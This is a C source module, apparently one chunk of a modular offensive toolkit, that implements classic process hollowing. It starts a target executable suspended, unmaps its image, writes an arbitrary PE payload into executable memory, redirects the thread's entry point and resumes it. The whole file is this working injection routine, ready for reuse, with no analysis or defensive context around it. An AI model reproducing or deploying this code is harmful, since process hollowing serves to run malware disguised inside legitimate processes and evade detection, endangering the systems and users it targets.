// chunk: injection/process_hollow
// depends: (none)
// provides: inject_process_hollow
// headers: windows.h, winternl.h
// note: Classic process hollowing injection

#ifndef CHUNK_INJECTION_PROCESS_HOLLOW
#define CHUNK_INJECTION_PROCESS_HOLLOW

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

static int inject_process_hollow(const char *target_exe, unsigned char *payload,
                                 DWORD payload_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(target_exe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

#ifdef _WIN64
    PVOID peb_base;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &peb_base, sizeof(peb_base), NULL);
#else
    PVOID peb_base;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &peb_base, sizeof(peb_base), NULL);
#endif

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, peb_base);
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);

    PVOID remote_base = VirtualAllocEx(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase,
                                       nt->OptionalHeader.SizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_base) {
        remote_base = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

    WriteProcessMemory(pi.hProcess, remote_base, payload, nt->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                          (PVOID)((ULONG_PTR)remote_base + section[i].VirtualAddress),
                          payload + section[i].PointerToRawData,
                          section[i].SizeOfRawData, NULL);
    }

#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remote_base, sizeof(remote_base), NULL);
    ctx.Rcx = (DWORD64)remote_base + nt->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &remote_base, sizeof(remote_base), NULL);
    ctx.Eax = (DWORD)remote_base + nt->OptionalHeader.AddressOfEntryPoint;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 1;
}

#endif
